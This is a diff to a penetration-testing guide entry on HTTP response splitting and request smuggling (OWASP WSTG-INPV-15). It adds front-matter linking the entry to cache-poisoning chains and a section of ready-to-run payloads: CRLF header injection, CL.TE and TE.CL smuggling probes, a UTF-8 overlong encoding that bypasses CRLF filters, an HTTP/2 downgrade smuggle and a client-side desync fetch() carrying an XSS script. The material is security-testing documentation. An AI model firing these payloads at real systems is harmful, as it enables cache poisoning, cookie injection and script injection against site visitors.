@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-inpv-01: "CRLF/response-splitting injection smuggles a forged HTTP response into a shared cache, poisoning it to serve a Reflected XSS payload to every subsequent visitor = Critical (Mass Client Compromise via Cache Poisoning)"
 ---
 
 # wstg-inpv-15
@@ -330,6 +331,64 @@ tester.run_tests()
 
 ---
 
+## Example Commands/Payloads
+
+```bash
+# CRLF response splitting via redirect param
+curl -s -I "https://{target}/redirect?url=http://test.com%0d%0aSet-Cookie:%20injected=true"
+
+# CL.TE smuggling probe (raw request over TLS socket)
+printf 'POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | openssl s_client -connect {target}:443 -quiet
+
+# TE.CL smuggling probe
+printf 'POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n' | openssl s_client -connect {target}:443 -quiet
+```
+
+| Payload | Technique | Detection Pattern |
+| --- | --- | --- |
+| `%0d%0aSet-Cookie:%20injected=true` | CRLF response splitting | Injected `Set-Cookie` header appears in the response |
+| `Content-Length` + `Transfer-Encoding: chunked` (front trusts CL) | CL.TE smuggling | Back-end error, or a leftover `G` prefixes the next response |
+| Obfuscated `Transfer-Encoding: xchunked` / duplicate TE headers | TE.TE desync | 403/502, or response content for the wrong request |
+| Timing delta on a crafted desync request | HTTP desync detection | Response time markedly higher than baseline |
+
+### CRLF Filter Bypass via UTF-8 Overlong Encoding
+
+Some frameworks/CDNs strip raw `%0d%0a` but Firefox (and some server stacks) normalize out-of-range UTF-8 characters that decode to CR/LF, slipping past naive blocklists:
+
+```bash
+# %E5%98%8A decodes to CR, %E5%98%8D decodes to LF
+curl -s "https://{target}/?lang=en%E5%98%8A%E5%98%8DSet-Cookie:%20injected=true"
+```
+
+| UTF-8 char | Hex | Stripped to |
+| --- | --- | --- |
+| `嘊` | `%E5%98%8A` | `%0A` (LF) |
+| `嘍` | `%E5%98%8D` | `%0D` (CR) |
+| `嘾` | `%E5%98%BE` | `>` |
+| `嘼` | `%E5%98%BC` | `<` |
+
+### HTTP/2 Request Smuggling (downgrade to HTTP/1.1)
+
+```bash
+# When an HTTP/2 front-end downgrades to HTTP/1.1 for the back-end, a smuggled
+# CRLF/header in a pseudo-header can splice a second request into the downgraded stream
+curl -s --http2 "https://{target}/" -H 'header-name: ignored\r\n\r\nGET / HTTP/1.1\r\nHost: {target}'
+```
+
+### Client-Side Desync (CSD) — victim's browser triggers the smuggle
+
+```javascript
+// Hosted on an attacker page, forces the victim's browser to desync the target's connection
+fetch('https://{target}/redirect', {
+    method: 'POST',
+    body: `HEAD /404/ HTTP/1.1\r\nHost: {target}\r\n\r\nGET /x?x=<script>alert(document.domain)</script> HTTP/1.1\r\nX: Y`,
+    credentials: 'include',
+    mode: 'cors'
+}).catch(() => { location = 'https://{target}/' })
+```
+
+---
+
 ## Remediation
 
 ```nginx
@@ -373,6 +432,15 @@ HttpProtocolOptions Strict
 | **CWE-444** | Inconsistent Interpretation of HTTP Requests |
 | **CWE-113** | Improper Neutralization of CRLF Sequences    |
 
+
+---
+
+## References
+
+- [OWASP WSTG - WSTG-INPV-15: Testing for HTTP Splitting/Smuggling](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling)
+- [PortSwigger - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
+- [PayloadsAllTheThings - CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
+- [PayloadsAllTheThings - Request Smuggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling)
 
 ---
 
